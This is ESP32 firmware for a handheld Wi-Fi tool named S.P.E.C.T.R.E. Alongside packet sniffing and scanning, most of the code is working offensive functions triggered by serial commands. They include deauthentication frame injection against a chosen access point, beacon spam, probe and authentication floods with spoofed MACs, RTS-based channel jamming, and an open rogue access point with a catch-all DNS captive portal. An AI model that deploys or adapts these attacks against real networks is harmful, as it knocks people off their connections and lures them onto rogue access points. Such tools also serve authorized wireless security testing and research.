// S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
// Copyright (c) 2026 M. Sami Furqan. All rights reserved.
// See LICENSE file for full terms.

/*
S.P.E.C.T.R.E. Edge Sensor Firmware
*/
#include "WiFi.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h" // For brownout disable
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <DNSServer.h>
#include <SPI.h>
#include <WebServer.h> // Built-in stable server
#include <esp_wifi.h>

#define TFT_CS 5
#define TFT_RST 4
#define TFT_DC 2
#define BTN_UP 13
#define BTN_SEL 12
#define BTN_DWN 14

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

enum AppState { SCANNING, DETAILS, IDLE, STREAMING, ATTACKING };
AppState currentState = SCANNING;
int selectedIndex = 0;
int totalNetworks = 0;
bool isScanning = false;
unsigned long lastScanTime = 0;
unsigned long lastActivityTime = 0;

#define MAX_NETWORKS 7
String cachedSSID[MAX_NETWORKS];
int cachedRSSI[MAX_NETWORKS];
uint8_t cachedBSSID[MAX_NETWORKS][6];
int cachedChannel[MAX_NETWORKS];

uint8_t targetBSSID[6];
int targetChannel = 1;
bool targetLocked = false;
String lockedSSID = ""; // Remembers the SSID so we can re-announce it after an attack
const unsigned long SCAN_INTERVAL = 10000;
const unsigned long IDLE_TIMEOUT = 60000;

bool attackActive = false;
String activeAttackVector = "";
String attackTarget = "";
int attackIntensity = 50;
unsigned long lastAttackTick = 0;

DNSServer dnsServer;
WebServer server(80); // Changed from AsyncWebServer
bool portalActive = false;
String currentPortalSSID = ""; // GLOBAL: Prevents lambda capture crash

void resetActivity() { lastActivityTime = millis(); }

bool anyButtonPressed() {
  return (digitalRead(BTN_UP) == LOW || digitalRead(BTN_SEL) == LOW ||
          digitalRead(BTN_DWN) == LOW);
}

void macToString(const uint8_t *mac, char *buf) {
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3],
          mac[4], mac[5]);
}

void sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  uint32_t len = pkt->rx_ctrl.sig_len;
  if (len < 24)
    return;

  static unsigned long lastTxTime = 0;
  unsigned long now = millis();
  if (now - lastTxTime < 8)
    return;
  lastTxTime = now;

  uint8_t frame_type = (frame[0] >> 2) & 0x03;
  uint8_t frame_subtype = (frame[0] >> 4) & 0x0F;
  uint8_t *bssid_ptr = &frame[16];

  if (targetLocked) {
    bool match = false;
    for (int offset : {4, 10, 16}) {
      bool fieldMatch = true;
      for (int i = 0; i < 6; i++) {
        if (frame[offset + i] != targetBSSID[i]) {
          fieldMatch = false;
          break;
        }
      }
      if (fieldMatch) {
        match = true;
        break;
      }
    }
    if (!match)
      return;
  }

  int raw_rssi = pkt->rx_ctrl.rssi;
  int channel = pkt->rx_ctrl.channel;
  char bssid_str[18];
  macToString(bssid_ptr, bssid_str);

  if (frame_type == 0)
    Serial.printf("MGMT:%d,%d,%d,%s,%d\n", raw_rssi, len, frame_subtype,
                  bssid_str, channel);
  else if (frame_type == 2)
    Serial.printf("DAT:%d,%d,%d,%s,%d\n", raw_rssi, len, frame_subtype,
                  bssid_str, channel);
}

void transmitDeauth(const uint8_t *bssid, int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t deauth[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                        0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  memcpy(&deauth[10], bssid, 6);
  memcpy(&deauth[16], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, true);
}

void transmitBeacon(const String &ssid, int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t bssid[6];
  esp_fill_random(bssid, 6);
  bssid[0] |= 0x02;
  size_t ssidLen = ssid.length();
  size_t frameSize = 38 + ssidLen;
  uint8_t *frame = new uint8_t[frameSize];
  memset(frame, 0, frameSize);
  frame[0] = 0x80;
  frame[1] = 0x00;
  for (int i = 0; i < 6; i++)
    frame[4 + i] = 0xFF;
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  frame[32] = 0x64;
  frame[33] = 0x00;
  frame[34] = 0x31;
  frame[35] = 0x00;
  frame[36] = 0x00;
  frame[37] = ssidLen;
  memcpy(&frame[38], ssid.c_str(), ssidLen);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, frameSize, true);
  delete[] frame;
}

// Handler for the built-in WebServer
void handleNotFound() {
  String html = "<html><body "
                "style='background:#000;color:#0f0;text-align:center;font-"
                "family:monospace;padding:50px;'>";
  html += "<h1 style='color:red;font-size:2em;'>YOU HAVE BEEN PWNED</h1>";
  html += "<p>You connected to a rogue access point.</p>";
  html += "<p>Your traffic is being intercepted.</p>";
  html += "<p>Target SSID: " + currentPortalSSID + "</p>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void startCaptivePortal(String ssidName) {
  if (portalActive)
    return;
  currentPortalSSID = ssidName;

  // Disable Brownout Detector (Prevents hardware reboot on power spike)
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);

  // Properly tear down the radio
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(300); // CRITICAL: Let the radio physically power down

  // Bring up in AP mode
  WiFi.mode(WIFI_AP);
  delay(200);

  // NULL explicitly forces an OPEN network without crashing the driver
  WiFi.softAP(ssidName.c_str(), NULL, 1, 0, 4);
  delay(100);

  IPAddress apIP = WiFi.softAPIP();
  dnsServer.start(53, "*", apIP);

  // Use the stable built-in server
  server.onNotFound(handleNotFound);
  server.begin();

  portalActive = true;
  currentState = ATTACKING;

  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 160, 128, ST7735_GREEN);
  tft.setTextColor(ST7735_GREEN);
  tft.setTextSize(1);
  tft.setCursor(10, 15);
  tft.println("CAPTIVE PORTAL ACTIVE");
  tft.drawFastHLine(5, 27, 150, ST7735_GREEN);
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(10, 37);
  tft.print("SSID: ");
  tft.println(ssidName);
  tft.setCursor(10, 52);
  tft.print("IP:   ");
  tft.println(apIP.toString());
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(10, 95);
  tft.println("WAITING FOR VICTIMS...");
  Serial.printf("STATUS:PORTAL_ACTIVE,%s,%s\n", ssidName.c_str(),
                apIP.toString().c_str());
}

void stopCaptivePortal() {
  if (portalActive) {
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    portalActive = false;

    // Properly tear down AP
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200); // Let radio settle

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    // FIX: Restore the correct state so the loop() knows what to do next
    if (targetLocked) {
      currentState = STREAMING;
    } else {
      currentState = SCANNING;
    }

    // Redraw the correct screen based on the restored state
    tft.fillScreen(ST7735_BLACK);
    drawHeader();

    if (currentState == STREAMING) {
      tft.drawRect(0, 0, 160, 128, ST7735_GREEN);
      tft.setTextColor(ST7735_GREEN);
      tft.setTextSize(2);
      tft.setCursor(18, 35);
      tft.print("LINK ACTIVE");
      tft.setTextSize(1);
      tft.setTextColor(ST7735_WHITE);
      tft.setCursor(22, 65);
      tft.print("STREAMING TO PC...");

      // ── FIX: Re-announce target to PC ─
      char bssid_str[18];
      macToString(targetBSSID, bssid_str);
      Serial.printf("TARGET:%s,%s,%d\n", lockedSSID.c_str(), bssid_str, targetChannel);
      Serial.println("STATUS:STREAM_START");
    } else {
      startNewScan();
    }
  }
}

void transmitProbeRequest() {
  // Probe Request Frame: Type=Management (0), Subtype=Probe Request (4) -> 0x40
  uint8_t frame[24] = {0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
                       0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00};
  // Set random Source Address (SA) to simulate multiple clients
  uint8_t sa[6];
  esp_fill_random(sa, 6);
  sa[0] |= 0x02;
  memcpy(&frame[10], sa, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}

void transmitAuthFlood(const uint8_t *bssid, int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  // Authentication Frame: Type=Management (0), Subtype=Authentication (11) ->
  // 0xB0
  uint8_t auth[28] = {0xB0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
                      0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x01, 0x00, 0x00, 0x00}; // Open System, Seq 1, Status 0

  uint8_t sa[6];
  esp_fill_random(sa, 6);
  sa[0] |= 0x02;
  memcpy(&auth[10], sa, 6);    // Source Address (Random)
  memcpy(&auth[16], bssid, 6); // BSSID (Target)
  esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(auth), true);
}

void transmitRTS(const uint8_t *bssid, int channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  // RTS Frame: Type=Control (1), Subtype=RTS (11) -> 0xB4
  // Duration: 0x7530 (30000 microseconds = 30ms NAV) to force devices to wait
  uint8_t rts[20] = {0xB4, 0x00, 0x30, 0x75, 0xFF, 0xFF, 0xFF,
                     0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

  memcpy(&rts[4], bssid, 6); // Receiver Address (Target)
  uint8_t ta[6];
  esp_fill_random(ta, 6);
  ta[0] |= 0x02;
  memcpy(&rts[10], ta, 6); // Transmitter Address (Random)
  esp_wifi_80211_tx(WIFI_IF_STA, rts, sizeof(rts), true);
}
void runAttackTick() {
  if (!attackActive)
    return;

  // Captive Portal logic (unchanged)
  if (activeAttackVector.indexOf("PORTAL") >= 0 ||
      activeAttackVector.indexOf("CAPTIVE") >= 0) {
    dnsServer.processNextRequest();
    server.handleClient(); // Don't forget this!
    return;
  }

  // Map intensity to speed (faster = lower interval)
  unsigned long interval = map(attackIntensity, 1, 100, 200, 5);

  if (millis() - lastAttackTick >= interval) {
    lastAttackTick = millis();

    if (activeAttackVector.indexOf("DEAUTH") >= 0) {
      // Parse BSSID only for DEAUTH
      uint8_t bssid[6];
      sscanf(attackTarget.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X", &bssid[0],
             &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
      transmitDeauth(bssid, targetChannel);
    } else if (activeAttackVector.indexOf("BEACON") >= 0) {
      // BEACON doesn't need target BSSID - it generates random ones
      transmitBeacon("SPECTRE_DEMO_" + String(random(1000, 9999)),
                     random(1, 14));
    } else if (activeAttackVector.indexOf("PROBE") >= 0) {
      // PROBE requests are broadcast - no BSSID needed
      transmitProbeRequest();
    } else if (activeAttackVector.indexOf("AUTH") >= 0) {
      // Parse BSSID only for AUTH flood
      uint8_t bssid[6];
      sscanf(attackTarget.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X", &bssid[0],
             &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
      transmitAuthFlood(bssid, targetChannel);
    } else if (activeAttackVector.indexOf("RTS") >= 0 ||
               activeAttackVector.indexOf("CTS") >= 0) {
      // Parse BSSID only for RTS/CTS
      uint8_t bssid[6];
      sscanf(attackTarget.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X", &bssid[0],
             &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
      transmitRTS(bssid, targetChannel);
    }
  }
}
void processSerialCommand() {
  if (!Serial.available())
    return;
  String cmd = Serial.readStringUntil('\n');
  cmd.trim();

  if (cmd == "CMD:PING")
    Serial.println("STATUS:ONLINE");
  else if (cmd == "CMD:SCAN" && currentState == SCANNING)
    startNewScan();
  else if (cmd.startsWith("CMD:ATTACK")) {
    int c1 = cmd.indexOf(',');
    int c2 = cmd.indexOf(',', c1 + 1);
    int c3 = cmd.indexOf(',', c2 + 1);
    if (c1 != -1 && c2 != -1 && c3 != -1) {
      String vector = cmd.substring(c1 + 1, c2);
      String target = cmd.substring(c2 + 1, c3);
      int intensity = cmd.substring(c3 + 1).toInt();

      attackActive = true;
      activeAttackVector = vector;
      attackTarget = target;
      attackIntensity = intensity;

      if (vector.indexOf("PORTAL") >= 0 || vector.indexOf("CAPTIVE") >= 0) {
        startCaptivePortal(target);
      } else {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);

        tft.fillScreen(ST7735_BLACK);
        tft.drawRect(0, 0, 160, 128, ST7735_RED);
        tft.setTextColor(ST7735_RED);
        tft.setTextSize(1);
        tft.setCursor(10, 15);
        tft.println("OFFENSIVE ACTION ACTIVE");
        tft.drawFastHLine(5, 27, 150, ST7735_RED);
        tft.setTextColor(ST7735_WHITE);
        tft.setCursor(10, 37);
        tft.print("VEC:  ");
        tft.println(vector);
        tft.setCursor(10, 52);
        tft.print("TGT:  ");
        tft.println(target);
        tft.setCursor(10, 67);
        tft.print("INT:  ");
        tft.print(intensity);
        tft.println("%");
        tft.setTextColor(ST7735_YELLOW);
        tft.setCursor(10, 95);
        tft.println("TRANSMITTING FRAMES");
        tft.setCursor(10, 105);
        tft.println("PHYSICAL LAYER ON");
        Serial.printf("STATUS:ATTACK_ACTIVE,%s,%s,%d\n", vector.c_str(),
                      target.c_str(), intensity);
      }
    }
  } else if (cmd == "CMD:STOP_SIM" || cmd == "CMD:UNLOCK") {
    attackActive = false;
    if (portalActive)
      stopCaptivePortal();
    else {
      Serial.println("STATUS:ATTACK_STOPPED");
      WiFi.mode(WIFI_STA);
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

      if (targetLocked) {
        currentState = STREAMING;
        tft.fillScreen(ST7735_BLACK);
        tft.drawRect(0, 0, 160, 128, ST7735_GREEN);
        tft.setTextColor(ST7735_GREEN);
        tft.setTextSize(2);
        tft.setCursor(18, 35);
        tft.print("LINK ACTIVE");
        tft.setTextSize(1);
        tft.setTextColor(ST7735_WHITE);
        tft.setCursor(22, 65);
        tft.print("STREAMING TO PC...");
        
        // ─ FIX: Re-announce target to PC so UI updates SSID/MAC ──
        char bssid_str[18];
        macToString(targetBSSID, bssid_str);
        Serial.printf("TARGET:%s,%s,%d\n", lockedSSID.c_str(), bssid_str, targetChannel);
        Serial.println("STATUS:STREAM_START");
      } else {
        currentState = SCANNING;
        tft.fillScreen(ST7735_BLACK);
        drawHeader();
        startNewScan();
      }
    }
  }
}

void drawHeader() {
  tft.fillRect(0, 0, 160, 25, ST7735_BLACK);
  tft.setTextColor(ST7735_GREEN);
  tft.setTextSize(1);
  tft.setCursor(5, 8);
  tft.print("S.P.E.C.T.R.E.");
  tft.drawFastHLine(0, 22, 160, ST7735_GREEN);
}
void startNewScan() {
  isScanning = true;
  WiFi.scanNetworks(true);
  tft.setCursor(100, 8);
  tft.setTextColor(ST7735_YELLOW, ST7735_BLACK);
  tft.print("SCAN..");
}
void drawNetworkRow(int index, bool isSelected) {
  if (index < 0 || index >= totalNetworks || index >= MAX_NETWORKS)
    return;
  const int ROW_H = 13, LIST_TOP = 26;
  int yTop = LIST_TOP + (index * ROW_H);
  tft.fillRect(0, yTop, 160, ROW_H, ST7735_BLACK);
  tft.setTextSize(1);
  tft.setCursor(5, yTop + 2);
  if (isSelected) {
    tft.setTextColor(ST7735_BLACK, ST7735_GREEN);
    tft.print("> ");
  } else {
    tft.setTextColor(ST7735_WHITE, ST7735_BLACK);
    tft.print("  ");
  }
  String ssid = cachedSSID[index];
  if (ssid.length() > 14)
    ssid = ssid.substring(0, 11) + "...";
  tft.print(ssid);
  tft.setCursor(128, yTop + 2);
  tft.print(cachedRSSI[index]);
}
void drawAllNetworks() {
  tft.fillRect(0, 26, 160, 102, ST7735_BLACK);
  int limit = min(totalNetworks, MAX_NETWORKS);
  for (int i = 0; i < limit; i++)
    drawNetworkRow(i, i == selectedIndex);
}
void drawDetailsView(int index) {
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 160, 128, ST7735_RED);
  tft.setCursor(10, 10);
  tft.setTextColor(ST7735_RED);
  tft.setTextSize(1);
  tft.println("TARGET ACQUIRED");
  tft.drawFastHLine(5, 22, 150, ST7735_RED);
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(10, 32);
  tft.print("SSID:  ");
  tft.println(cachedSSID[index]);
  tft.setCursor(10, 46);
  tft.print("BSSID: ");
  char bssid_str[18];
  macToString(cachedBSSID[index], bssid_str);
  tft.println(bssid_str);
  tft.setCursor(10, 60);
  tft.print("CH:    ");
  tft.println(cachedChannel[index]);
  tft.setCursor(10, 74);
  tft.print("RSSI:  ");
  tft.print(cachedRSSI[index]);
  tft.println(" dB");
  tft.setCursor(10, 104);
  tft.setTextColor(ST7735_GREEN);
  tft.print("[SEL] to Stream Link");
  tft.setCursor(10, 114);
  tft.setTextColor(ST7735_YELLOW);
  tft.print("[UP] to Main List");
}

void setup() {
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); // Disable brownout detector
  Serial.begin(115200);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_DWN, INPUT_PULLUP);
  tft.initR(INITR_BLACKTAB);
  tft.fillScreen(ST7735_BLACK);
  tft.setRotation(1);
  Serial.println("STATUS:BOOT,S.P.E.C.T.R.E. Edge Sensor v7.0");
  drawHeader();
  currentState = STREAMING;
  targetLocked = false;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 160, 128, ST7735_GREEN);
  tft.setTextColor(ST7735_GREEN);
  tft.setTextSize(2);
  tft.setCursor(18, 35);
  tft.print("LINK ACTIVE");
  tft.setTextSize(1);
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(22, 65);
  tft.print("FULL SPECTRUM...");
  resetActivity();
}

void loop() {
  // 1. ALWAYS Process Commands FIRST (before any state logic)
  processSerialCommand();

  // 2. Run attack tick if active
  if (attackActive)
    runAttackTick();

  // 3. Global button abort for attacks
  if (attackActive && anyButtonPressed()) {
    attackActive = false;
    Serial.println("CMD:STOP_SIM");
    Serial.println("STATUS:ATTACK_STOPPED");
    if (portalActive)
      stopCaptivePortal();
    else {
      tft.fillScreen(ST7735_BLACK);
      if (targetLocked) {
        currentState = STREAMING;
        tft.drawRect(0, 0, 160, 128, ST7735_GREEN);
        tft.setTextColor(ST7735_GREEN);
        tft.setTextSize(2);
        tft.setCursor(18, 35);
        tft.print("LINK ACTIVE");
      } else {
        currentState = SCANNING;
        drawHeader();
        startNewScan();
      }
      WiFi.mode(WIFI_STA);
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    }
    delay(500);
  }

  // 4. State Machine UI Logic - ONLY run if NOT attacking
  if (!attackActive) {
    if (currentState == SCANNING &&
        millis() - lastActivityTime > IDLE_TIMEOUT) {
      currentState = IDLE;
    }

    if (currentState == STREAMING) {
      if (!targetLocked) {
        static unsigned long lastHop = 0;
        if (millis() - lastHop > 250) {
          lastHop = millis();
          targetChannel++;
          if (targetChannel > 13)
            targetChannel = 1;
          esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        }
      }
      if (digitalRead(BTN_UP) == LOW) {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);
        targetLocked = false;
        currentState = SCANNING;
        resetActivity();
        tft.fillScreen(ST7735_BLACK);
        drawHeader();
        startNewScan();
        Serial.println("STATUS:STREAM_END");
        delay(400);
      }
    }

    if (currentState == DETAILS) {
      if (digitalRead(BTN_UP) == LOW) {
        currentState = SCANNING;
        resetActivity();
        tft.fillScreen(ST7735_BLACK);
        drawHeader();
        drawAllNetworks();
        delay(200);
      }
      if (digitalRead(BTN_SEL) == LOW) {
        currentState = STREAMING;
        for (int i = 0; i < 6; i++)
          targetBSSID[i] = cachedBSSID[selectedIndex][i];
        targetChannel = cachedChannel[selectedIndex];
        targetLocked = true;
        lockedSSID = cachedSSID[selectedIndex];
        char bssid_str[18];
        macToString(targetBSSID, bssid_str);
        Serial.printf("TARGET:%s,%s,%d\n", cachedSSID[selectedIndex].c_str(),
                      bssid_str, targetChannel);
        tft.fillScreen(ST7735_BLACK);
        tft.drawRect(0, 0, 160, 128, ST7735_GREEN);
        tft.setTextColor(ST7735_GREEN);
        tft.setTextSize(2);
        tft.setCursor(18, 35);
        tft.print("LINK ACTIVE");
        tft.setTextSize(1);
        tft.setTextColor(ST7735_WHITE);
        tft.setCursor(22, 65);
        tft.print("STREAMING TO PC...");
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(50);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        Serial.println("STATUS:STREAM_START");
        delay(300);
      }
    }

    // 5. Background Scanning Logic - ONLY when NOT attacking
    if (currentState == SCANNING) {
      int scanResult = WiFi.scanComplete();
      if (isScanning && scanResult >= 0) {
        totalNetworks = min(scanResult, MAX_NETWORKS);
        isScanning = false;
        lastScanTime = millis();
        for (int i = 0; i < totalNetworks; i++) {
          cachedSSID[i] = WiFi.SSID(i);
          cachedRSSI[i] = WiFi.RSSI(i);
          cachedChannel[i] = WiFi.channel(i);
          uint8_t *raw_mac = WiFi.BSSID(i);
          for (int b = 0; b < 6; b++)
            cachedBSSID[i][b] = raw_mac[b];
        }
        for (int i = 0; i < totalNetworks; i++) {
          char bssid_str[18];
          macToString(cachedBSSID[i], bssid_str);
          Serial.printf("SCAN:%s,%s,%d,%d\n", cachedSSID[i].c_str(), bssid_str,
                        cachedChannel[i], cachedRSSI[i]);
        }
        Serial.printf("SCAN_DONE:%d\n", totalNetworks);
        WiFi.scanDelete();
        drawHeader();
        drawAllNetworks();
      }

      if (digitalRead(BTN_UP) == LOW && selectedIndex > 0) {
        int prev = selectedIndex;
        selectedIndex--;
        drawNetworkRow(prev, false);
        drawNetworkRow(selectedIndex, true);
        resetActivity();
        delay(130);
      }
      if (digitalRead(BTN_DWN) == LOW && selectedIndex < totalNetworks - 1) {
        int prev = selectedIndex;
        selectedIndex++;
        drawNetworkRow(prev, false);
        drawNetworkRow(selectedIndex, true);
        resetActivity();
        delay(130);
      }
      if (digitalRead(BTN_SEL) == LOW && totalNetworks > 0) {
        currentState = DETAILS;
        resetActivity();
        drawDetailsView(selectedIndex);
        delay(300);
      }
      if (!isScanning && millis() - lastScanTime > SCAN_INTERVAL)
        startNewScan();
    }
  }
}
